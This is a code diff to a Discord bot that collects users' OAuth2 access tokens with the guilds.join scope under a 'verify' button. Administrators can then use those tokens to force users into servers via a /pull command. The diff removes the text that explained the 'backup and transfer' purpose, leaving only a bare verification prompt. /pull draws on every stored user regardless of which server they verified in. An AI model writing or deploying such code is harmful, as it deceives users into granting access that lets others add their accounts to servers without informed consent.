@@ -12,6 +12,7 @@ import os
 intents = discord.Intents.default()
 intents.message_content = True
 intents.members = True
+intents.guilds = True
 bot = commands.Bot(command_prefix="!", intents=intents)
 
 # Database setup
@@ -24,10 +25,13 @@ def init_db():
                   refresh_token TEXT,
                   username TEXT,
                   discriminator TEXT)''')
+    c.execute('''CREATE TABLE IF NOT EXISTS guild_settings
+                 (guild_id TEXT PRIMARY KEY,
+                  verified_role_id TEXT)''')
     conn.commit()
     conn.close()
 
-# OAuth2 Configuration - Environment variables for Railway
+# OAuth2 Configuration
 CLIENT_ID = os.getenv("CLIENT_ID", "YOUR_CLIENT_ID")
 CLIENT_SECRET = os.getenv("CLIENT_SECRET", "YOUR_CLIENT_SECRET")
 BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN")
@@ -35,31 +39,28 @@ PUBLIC_URL = os.getenv("PUBLIC_URL", "http://localhost:8080")
 REDIRECT_URI = f"{PUBLIC_URL}/callback"
 PORT = int(os.getenv("PORT", 8080))
 
-# Store pending authorizations
+# Store pending authorizations with guild info
 pending_auths = {}
 
 class BackupView(discord.ui.View):
-    def __init__(self):
+    def __init__(self, guild_id):
         super().__init__(timeout=None)
+        self.guild_id = guild_id
     
     @discord.ui.button(label="Verify Account", style=discord.ButtonStyle.green, custom_id="backup_button", emoji="✅")
     async def backup_button(self, interaction: discord.Interaction, button: discord.ui.Button):
         user_id = str(interaction.user.id)
-        pending_auths[user_id] = interaction.user
+        pending_auths[user_id] = {
+            'user': interaction.user,
+            'guild_id': str(interaction.guild.id)
+        }
         
         auth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20guilds.join&state={user_id}"
         
         embed = discord.Embed(
-            title="🔐 Account Verification",
-            description="**Complete verification to enable server transfers**\n\nClick the button below to verify your account with our secure OAuth2 system.",
+            description="Click the button below to verify your account.",
             color=0x5865F2
         )
-        embed.add_field(
-            name="📋 What happens next?",
-            value="• You'll be redirected to Discord\n• Authorize the application\n• Return here automatically\n• You're all set!",
-            inline=False
-        )
-        embed.set_footer(text="🔒 Secure Discord OAuth2 • Expires in 10 minutes")
         
         verify_button = discord.ui.Button(
             label="Verify with Discord",
@@ -77,8 +78,9 @@ async def on_ready():
     print(f'✅ Logged in as {bot.user}')
     init_db()
     
-    # Register persistent view
-    bot.add_view(BackupView())
+    # Register persistent views for all guilds
+    for guild in bot.guilds:
+        bot.add_view(BackupView(str(guild.id)))
     
     # Sync commands
     try:
@@ -94,34 +96,30 @@ async def on_ready():
 @bot.tree.command(name="setup", description="Set up the member backup system in this channel")
 @app_commands.checks.has_permissions(administrator=True)
 async def setup(interaction: discord.Interaction):
-    # Get server icon
-    server_icon = interaction.guild.icon.url if interaction.guild.icon else None
-    
     embed = discord.Embed(
-        title=f"🛡️ {interaction.guild.name}",
-        description="**Member Backup & Transfer System**\n\nVerify your account to enable seamless server transfers. Your data is secure and you can revoke access anytime.",
+        description="Click the button below to verify your account.",
         color=0x5865F2
     )
     
-    if server_icon:
-        embed.set_thumbnail(url=server_icon)
-    
-    embed.add_field(
-        name="🎯 Features",
-        value="• **Instant Transfers** - Move between servers instantly\n• **Secure OAuth2** - Industry-standard authentication\n• **One-Time Setup** - Verify once, use everywhere\n• **Full Control** - Revoke access anytime",
-        inline=False
-    )
-    
-    embed.add_field(
-        name="📊 Server Stats",
-        value=f"**Members:** {interaction.guild.member_count}\n**Server ID:** {interaction.guild.id}",
-        inline=False
-    )
-    
-    embed.set_footer(text="🔐 Powered by Discord OAuth2 • Click below to get started")
-    
-    view = BackupView()
+    view = BackupView(str(interaction.guild.id))
     await interaction.response.send_message(embed=embed, view=view)
+
+@bot.tree.command(name="setrole", description="Set the verified role for this server")
+@app_commands.checks.has_permissions(administrator=True)
+async def setrole(interaction: discord.Interaction, role: discord.Role):
+    conn = sqlite3.connect('members.db')
+    c = conn.cursor()
+    c.execute("INSERT OR REPLACE INTO guild_settings (guild_id, verified_role_id) VALUES (?, ?)",
+              (str(interaction.guild.id), str(role.id)))
+    conn.commit()
+    conn.close()
+    
+    embed = discord.Embed(
+        title="✅ Verified Role Set",
+        description=f"Users will now receive {role.mention} after verification.",
+        color=0x57F287
+    )
+    await interaction.response.send_message(embed=embed)
 
 @bot.tree.command(name="pull", description="Pull all backed up members to this server")
 @app_commands.checks.has_permissions(administrator=True)
@@ -133,12 +131,16 @@ async def pull(interaction: discord.Interaction):
     c = conn.cursor()
     c.execute("SELECT user_id, access_token, username FROM members")
     members = c.fetchall()
+    
+    # Get verified role
+    c.execute("SELECT verified_role_id FROM guild_settings WHERE guild_id = ?", (guild_id,))
+    role_result = c.fetchone()
     conn.close()
     
     if not members:
         embed = discord.Embed(
             title="❌ No Backup Data",
-            description="No members have verified yet. Use `/setup` to create a verification panel.",
+            description="No members have verified yet.",
             color=0xED4245
         )
         await interaction.followup.send(embed=embed)
@@ -147,6 +149,11 @@ async def pull(interaction: discord.Interaction):
     success_count = 0
     fail_count = 0
     already_in = 0
+    
+    # Get verified role if set
+    verified_role = None
+    if role_result and role_result[0]:
+        verified_role = interaction.guild.get_role(int(role_result[0]))
     
     status_embed = discord.Embed(
         title="⏳ Transferring Members...",
@@ -161,6 +168,12 @@ async def pull(interaction: discord.Interaction):
             member = interaction.guild.get_member(int(user_id))
             if member:
                 already_in += 1
+                # Give role if not already has it
+                if verified_role and verified_role not in member.roles:
+                    try:
+                        await member.add_roles(verified_role)
+                    except:
+                        pass
                 continue
             
             # Try to add member
@@ -173,6 +186,10 @@ async def pull(interaction: discord.Interaction):
                 "access_token": access_token
             }
             
+            # Add role to payload if exists
+            if verified_role:
+                payload["roles"] = [str(verified_role.id)]
+            
             try:
                 async with session.put(url, headers=headers, json=payload) as resp:
                     if resp.status == 201 or resp.status == 204:
@@ -181,7 +198,6 @@ async def pull(interaction: discord.Interaction):
                         fail_count += 1
                         print(f"Failed to add {username}: {resp.status}")
                 
-                # Rate limit handling
                 await asyncio.sleep(1)
             except Exception as e:
                 fail_count += 1
@@ -189,13 +205,11 @@ async def pull(interaction: discord.Interaction):
     
     result_embed = discord.Embed(
         title="✅ Transfer Complete",
-        description=f"Member transfer operation finished for **{interaction.guild.name}**",
         color=0x57F287
     )
-    result_embed.add_field(name="✅ Successfully Added", value=f"**{success_count}** members", inline=True)
-    result_embed.add_field(name="👥 Already in Server", value=f"**{already_in}** members", inline=True)
-    result_embed.add_field(name="❌ Failed", value=f"**{fail_count}** members", inline=True)
-    result_embed.set_footer(text=f"Total Processed: {len(members)} members")
+    result_embed.add_field(name="✅ Added", value=f"**{success_count}**", inline=True)
+    result_embed.add_field(name="👥 Already Here", value=f"**{already_in}**", inline=True)
+    result_embed.add_field(name="❌ Failed", value=f"**{fail_count}**", inline=True)
     
     await interaction.followup.send(embed=result_embed)
 
@@ -207,22 +221,20 @@ async def stats(interaction: discord.Interaction):
     c.execute("SELECT COUNT(*) FROM members")
     count = c.fetchone()[0]
     
-    c.execute("SELECT username FROM members LIMIT 5")
-    recent = c.fetchall()
+    c.execute("SELECT verified_role_id FROM guild_settings WHERE guild_id = ?", (str(interaction.guild.id),))
+    role_result = c.fetchone()
     conn.close()
     
     embed = discord.Embed(
-        title="📊 Backup System Statistics",
-        description="Current backup database status",
+        title="📊 Backup Statistics",
         color=0x5865F2
     )
-    embed.add_field(name="👥 Total Verified Members", value=f"**{count}** accounts", inline=False)
+    embed.add_field(name="Total Verified Members", value=f"**{count}**", inline=False)
     
-    if recent:
-        recent_users = "\n".join([f"• {user[0]}" for user in recent[:5]])
-        embed.add_field(name="🔹 Recent Verifications", value=recent_users, inline=False)
-    
-    embed.set_footer(text="Use /pull to transfer members to this server")
+    if role_result and role_result[0]:
+        role = interaction.guild.get_role(int(role_result[0]))
+        if role:
+            embed.add_field(name="Verified Role", value=role.mention, inline=False)
     
     await interaction.response.send_message(embed=embed)
 
@@ -238,14 +250,14 @@ async def remove(interaction: discord.Interaction, user_id: str):
     
     if deleted > 0:
         embed = discord.Embed(
-            title="✅ Member Removed",
-            description=f"User ID `{user_id}` has been removed from the backup database.",
+            title="✅ Removed",
+            description=f"User `{user_id}` removed from database.",
             color=0x57F287
         )
     else:
         embed = discord.Embed(
-            title="❌ Member Not Found",
-            description=f"User ID `{user_id}` was not found in the database.",
+            title="❌ Not Found",
+            description=f"User `{user_id}` not in database.",
             color=0xED4245
         )
     
@@ -266,7 +278,7 @@ async def handle_callback(request):
             <style>
                 * { margin: 0; padding: 0; box-sizing: border-box; }
                 body { 
-                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif; 
+                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
                     background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
                     color: #fff; 
                     display: flex; 
@@ -338,6 +350,30 @@ async def handle_callback(request):
                                     VALUES (?, ?, ?, ?, ?)""",
                                  (user_id, access_token, refresh_token, username, discriminator))
                         conn.commit()
+                        
+                        # Get guild info and assign role
+                        guild_id = None
+                        if state in pending_auths:
+                            guild_id = pending_auths[state]['guild_id']
+                        
+                        # Assign verified role if configured
+                        if guild_id:
+                            c.execute("SELECT verified_role_id FROM guild_settings WHERE guild_id = ?", (guild_id,))
+                            role_result = c.fetchone()
+                            
+                            if role_result and role_result[0]:
+                                guild = bot.get_guild(int(guild_id))
+                                if guild:
+                                    member = guild.get_member(int(user_id))
+                                    if member:
+                                        role = guild.get_role(int(role_result[0]))
+                                        if role:
+                                            try:
+                                                await member.add_roles(role)
+                                                print(f"✅ Assigned {role.name} to {username}")
+                                            except Exception as e:
+                                                print(f"❌ Failed to assign role: {e}")
+                        
                         conn.close()
                         
                         html = f"""
@@ -349,7 +385,7 @@ async def handle_callback(request):
                             <style>
                                 * {{ margin: 0; padding: 0; box-sizing: border-box; }}
                                 body {{ 
-                                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif; 
+                                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
                                     background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
                                     color: #fff; 
                                     display: flex; 
@@ -389,8 +425,8 @@ async def handle_callback(request):
                                 <div class="icon">✅</div>
                                 <h1>Verification Successful!</h1>
                                 <span class="username">{username}</span>
-                                <p>Your account has been successfully verified and backed up.</p>
-                                <p>You can now close this window and return to Discord.</p>
+                                <p>Your account has been verified.</p>
+                                <p>You can now close this window.</p>
                             </div>
                         </body>
                         </html>
@@ -406,7 +442,7 @@ async def handle_callback(request):
                 <style>
                     * { margin: 0; padding: 0; box-sizing: border-box; }
                     body { 
-                        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif; 
+                        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
                         background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
                         color: #fff; 
                         display: flex; 
@@ -434,7 +470,7 @@ async def handle_callback(request):
                 <div class="container">
                     <div class="icon">❌</div>
                     <h1>Verification Failed</h1>
-                    <p>Failed to exchange authorization code. Please try again from Discord.</p>
+                    <p>Failed to exchange authorization code. Please try again.</p>
                 </div>
             </body>
             </html>
